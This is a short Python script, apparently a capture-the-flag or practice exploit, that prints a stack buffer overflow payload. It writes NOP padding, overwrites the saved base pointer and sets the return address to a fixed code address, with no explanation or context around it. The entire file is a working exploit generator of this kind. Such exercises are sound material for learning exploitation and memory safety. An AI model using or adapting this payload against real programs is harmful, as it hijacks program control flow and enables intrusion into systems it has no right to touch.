#!/usr/bin/python

import struct
import sys

buffsize = 24
offset = 8

padding = b'\x90'*(buffsize+offset)
ebp = b'\x90'*8
eip = b'\x23\x12\x40'

sys.stdout.buffer.write(padding+ebp+eip)
